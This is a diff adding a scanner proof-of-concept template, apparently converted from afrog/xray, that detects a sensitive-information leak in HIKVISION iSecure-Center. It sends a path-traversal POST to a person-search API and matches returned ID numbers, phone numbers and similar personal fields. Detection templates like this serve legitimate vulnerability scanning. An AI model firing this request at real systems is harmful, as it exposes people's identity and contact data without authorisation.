@@ -1,0 +1,39 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: ' {"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1} '
+    headers:
+      Content-Type: application/json;charset=utf-8
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":"0"'
+          - '"msg":"SUCCESS!"'
+          - data
+          - personIndexCode
+          - name
+          - organizationPath
+          - sex
+          - certType
+          - certNo
+          - phone
+          - jobNo
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/isupm/api/api/..;/..;/person/find'
+id: isecure-center-leakinfo
+info:
+  author: Hardess
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: HiKVISION iSecure-Center敏感信息泄露
+  severity: high
+  tags: isecure-center,leakinfo,argus-import
